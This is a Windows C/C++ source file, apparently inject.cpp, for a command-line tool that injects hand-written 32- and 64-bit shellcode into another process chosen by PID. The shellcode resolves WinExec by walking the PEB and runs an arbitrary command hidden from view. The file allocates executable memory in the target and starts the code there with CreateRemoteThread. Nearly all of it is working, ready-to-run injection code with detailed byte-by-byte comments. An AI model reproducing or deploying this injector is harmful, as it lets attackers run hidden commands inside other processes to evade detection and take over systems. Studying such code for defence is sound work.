
/*
    build with gcc:
        $ g++ inject.cpp -o inject.exe
    build with msvc:
        $ vcvars32
        $ cl inject.cpp
*/

/*
    Tested on:
        - Windows 10 x64
        - Windows 7 x64
        - Windows Server 2008 x86
        - Windows XP x86
*/

#include <windows.h>
#include <stdio.h>

static enum {
    x32,
    x64
} pArch;

CHAR bShellCode32[] = {

    '\x64', '\xa1', '\x30', '\x00', '\x00', '\x00', // mov eax, FS:[0x30]; pointer to PEB (process environment block)
    '\x8b', '\x40', '\x0c', // mov eax,dword ptr [eax+0xc]; pointer to the PEB_LDR_DATA structure, see https://docs.microsoft.com/en-us/windows/desktop/api/winternl/ns-winternl-_peb_ldr_data
    '\x8b', '\x70', '\x14', // mov esi,dword ptr [eax+0x14]; PEB_LDR_DATA.InMemOrderModuleList
    '\xad', // lodsd 
    '\x96', // xchg eax,esi 
    '\xad', // lodsd
    '\x8b', '\x58', '\x10', // mov ebx,dword ptr [eax+0x10]; base of kernel32.dll
    '\x8b', '\x53', '\x3c', // mov edx,dword ptr [ebx+0x3c]; kernel32_DOS.e_lfanew, see https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html
    '\x01', '\xda', // add edx,ebx; kernel32_base + kernel32_DOS.e_lfanew = kernel32.PE_Header
    '\x8b', '\x52', '\x78', // mov edx,dword ptr [edx+0x78]; *(kernel32.PE_HEADER+0x78) = DataDirectory->VirtualAddress; see https://docs.microsoft.com/en-us/windows/desktop/api/winnt/ns-winnt-_image_data_directory
    '\x01', '\xda', // add edx,ebx; kernel32.IMAGE_EXPORT_DIRECTORY = kernel32.base + DataDirectory->VirtualAddress; see http://pinvoke.net/default.aspx/Structures.IMAGE_EXPORT_DIRECTORY
    '\x8b', '\x72', '\x20', // mov esi,dword ptr [edx+0x20]; *(kernel32.IMAGE_EXPORT_DIRECTORY+0x20) = rva_of(AddressOfNames)
    '\x01', '\xde', // add esi,ebx; kernel32.base + rva_of(AddressOfNames) = kernel32.AddressOfNames
    '\x31', '\xc9', // xor ecx,ecx
    '\x41', // inc ecx; loop through all the names to get "WinExec" ordinal
    '\xad', // lodsd 
    '\x01', '\xd8', // add eax,ebx; api_name
    '\x81', '\x38', '\x57', '\x69', '\x6e', '\x45', // cmp dword ptr [eax],0x456e6957; 'WinE'
    '\x75', '\xf4', // jnz $-10
    '\x81', '\x78', '\x04', '\x78', '\x65', '\x63', '\x00', // cmp dword ptr [eax+0x4],0x00636578; 'xec\0'
    '\x75', '\xeb', // jnz $-19
    '\x8b', '\x72', '\x24', // mov esi,dword ptr [edx+0x24]; *(kernel32.IMAGE_EXPORT_DIRECTORY+0x24)=rva_of(AddressOfNameOrdinals)
    '\x01', '\xde', // add esi,ebx; kernel32.base + rva_of(AddressOfNameOrdinals) = kernel32.AddressOfNameOrdinals
    '\x66', '\x8b', '\x0c', '\x4e', // mov cx,word ptr [esi+ecx*2]; number of functions
    '\x49', // dec ecx
    '\x8b', '\x72', '\x1c', // mov esi,dword ptr [edx+0x1c]; *(kernel32.IMAGE_EXPORT_DIRECTORY+0x1c) = rva_of(AddressOfFunctions)
    '\x01', '\xde', // add esi,ebx; kernel32.base + rva_of(AddressOfFunctions) = kernel32.AddressOfFunctions, address table
    '\x8b', '\x14', '\x8e', // mov edx,dword ptr [esi+ecx*4]; rva of WinExec
    '\x01', '\xda', // add edx,ebx; va of  WinExec
    '\x31', '\xc9', // xor ecx,ecx
    '\x51', // push ecx; uCmdShow = SW_HIDE, you can show the console by executing 'inject.exe [pid] "cmd /c start cmd"'
    '\xe8', '\x00', '\x00', '\x00' ,'\x00', // call $0; a trick to get the current next instruction pointer
    '\x59', // pop ecx; ecx = eip
    '\x83', '\xc1', '\x08', // add ecx, 8; *ecx = "<command_to_be_executed>", because it will be written below the shellcode 
    '\x51', // push ecx; lpCmdLine
    '\xff', '\xd2', // call edx; WinExec(lpCmdLine, SW_HIDE);
    '\xc3', // ret; return to BaseThreadInitThunk
};

CHAR bShellCode64[] = {

    '\x65', '\x48', '\x8B', '\x04', '\x25', '\x60', '\x00', '\x00', '\x00',  // mov rax, qword ptr gs:[0x60]
    '\x48', '\x8b', '\x40', '\x18',  // mov rax, qword ptr [rax+0x18]
    '\x48', '\x8b', '\x70', '\x10',  // mov rsi, qword ptr [rax+0x10]
    '\x48', '\xad',  // lodsq
    '\x48', '\x8b', '\x30',  // mov rsi, qword ptr [rax]
    '\x48', '\x8b', '\x5e', '\x30',  // mov rbx, qword ptr [rsi+0x30]
    '\x8b', '\x53', '\x3c',  // mov edx,dword ptr [rbx+0x3c] 
    '\x48', '\x01', '\xda',  // add rdx,rbx 
    '\x8b', '\x92', '\x88', '\x00', '\x00', '\x00',  // mov edx,dword ptr [rdx+0x88] 
    '\x48', '\x01', '\xda',  // add rdx,rbx 
    '\x8b', '\x72', '\x20',  // mov esi,dword ptr [rdx+0x20] 
    '\x48', '\x01', '\xde',  // add rsi,rbx 
    '\x48', '\x31', '\xc9',  // xor rcx,rcx
    '\x48', '\xff', '\xc1',  // inc rcx 
    '\xad',  // lodsd
    '\x48', '\x01', '\xd8',  // add rax,rbx 
    '\x81', '\x38', '\x57', '\x69', '\x6e', '\x45',  // cmp dword ptr [rax],0x456e6957 
    '\x75', '\xf1',  // jnz -13
    '\x81', '\x78', '\x04', '\x78', '\x65', '\x63', '\x00',  // cmp dword ptr [rax+0x4],0x00636578
    '\x75', '\xe8',  // jnz -22
    '\x8b', '\x72', '\x24',  // mov esi,dword ptr [rdx+0x24]
    '\x48', '\x01', '\xde',  // add rsi,rbx 
    '\x66', '\x8b', '\x0c', '\x4e',  // mov cx,word ptr [rsi+rcx*2] 
    '\x48', '\xff', '\xc9',  // dec rcx
    '\x8b', '\x72', '\x1c',  // mov esi,dword ptr [rdx+0x1c] 
    '\x48', '\x01', '\xde',  // add rsi,rbx 
    '\x8b', '\x14', '\x8e',  // mov edx,dword ptr [rsi+rcx*4] 
    '\x48', '\x01', '\xda',  // add rdx,rbx 
    '\x48', '\x89', '\xd6',  // mov rsi, rdx
    '\x48', '\x31', '\xd2',  // xor rdx,rdx
    '\x48', '\x8d', '\x0d', '\x00', '\x00', '\x00', '\x00',  // lea rcx, qword ptr [rip]
    '\x48', '\x83', '\xc1', '\x0D',  // add rcx, 0xD
    '\x5D',  // pop rbp; very bad way to save the return address bacause rbp is non-volatile and should be preserved by the callee (may cause crash)
    '\x48', '\x83', '\xE4', '\xE0',  //  and rsp, 0xffffffffffffffe0; because x64 CreateProcessInternalA uses movaps instruction that requires rsp to be aligned with 16h
    '\xFF', '\xD6',  // call rsi
    '\x55',  // push rbp
    '\xc3'  // ret
};

int main(int argc, char** argv) {

    if (argc > 2)
    {

        DWORD Pid = atoi(argv[1]);
        PCHAR Cmd = argv[2];
        SIZE_T dwCmdLength = strlen(Cmd) + 1;
        HANDLE hProcess = OpenProcess(
            PROCESS_ALL_ACCESS,
            FALSE,
            Pid
        );

        if (!hProcess)
        {
            printf("Error at OpenProcess, code = %d\n", GetLastError());
            return 0;
        };

        HMODULE hKernel32 = NULL;
        if (!(hKernel32 = GetModuleHandle("kernel32")))
        {
            printf("Error at GetModuleHandle, code = %d\n", GetLastError());
            return 0;
        };

        pArch = x32;
        LPVOID fnIsWow64Process = NULL;
        if ((fnIsWow64Process = (LPVOID)GetProcAddress(hKernel32, "IsWow64Process")))
        {
            BOOL IsWow64 = TRUE;
            BOOL IsWin64 = FALSE;
            CHAR WoW64Dir[MAX_PATH] = {0};

            if (!((*(BOOL(*)(HANDLE, PBOOL)) fnIsWow64Process)(
                hProcess,
                &IsWow64
                )))
            {
                printf("Error at IsWow64Process, code = %d\n", GetLastError());
                return 0;
            };

            if (GetSystemWow64DirectoryA(WoW64Dir, sizeof(WoW64Dir))){
                IsWin64 = TRUE;
            } 
            else if (GetLastError() != ERROR_CALL_NOT_IMPLEMENTED)
            {
                printf("Error at GetSystemWow64DirectoryA, code = %d\n", GetLastError());
                return 0;
            };

            if (!IsWow64 && IsWin64)
            {
                pArch = x64;
            };
        }
        else
        {
            printf("Error at GetProcAddress, code = %d\n", GetLastError());
            return 0;
        };

        LPVOID bAddress = NULL;
        DWORD dwShellCodeSize = 0;
        UCHAR *bShellCode;
        if (pArch == x32) {
            bShellCode = (UCHAR*)bShellCode32;
            dwShellCodeSize = sizeof(bShellCode32);
        }
        else
        {
#if defined(_M_X64) || defined(__amd64__)
            bShellCode = (UCHAR*)bShellCode64;
            dwShellCodeSize = sizeof(bShellCode64);
#else
            puts("Use the 64-bit binary to target this x64 process");
            return 0;
#endif
        };

        if (!(bAddress = VirtualAllocEx(
            hProcess,
            NULL,
            dwShellCodeSize + dwCmdLength,
            (MEM_RESERVE | MEM_COMMIT),
            PAGE_EXECUTE_READWRITE
        )))
        {
            printf("Error at VirtualAllocEx, code = %d\n", GetLastError());
            return 0;
        };

        if (!WriteProcessMemory(
            hProcess,
            bAddress,
            bShellCode,
            dwShellCodeSize,
            NULL
        ) | !WriteProcessMemory(
            hProcess,
#if defined(_M_X64) || defined(__amd64__)
            (LPVOID)((ULONG64)bAddress + dwShellCodeSize),
#else
            (LPVOID)((ULONG32)bAddress + dwShellCodeSize),
#endif
            Cmd,
            dwCmdLength,
            NULL
        ))
        {
            printf("Error at WriteProcessMemory, code = %d\n", GetLastError());
            return 0;
        };

        if (!CreateRemoteThread(
            hProcess,
            NULL,
            0,
            (LPTHREAD_START_ROUTINE)bAddress,
            NULL,
            0,
            NULL
        ))
        {
            printf("Error at CreateRemoteThread, code = %d\n", GetLastError());
            return 0;
        };
        CloseHandle(hProcess);

        puts("Done !!!");
        return 0;
    }
    else
    {
        printf("%s [pid] [command]", argv[0]);
        return 0;
    }
}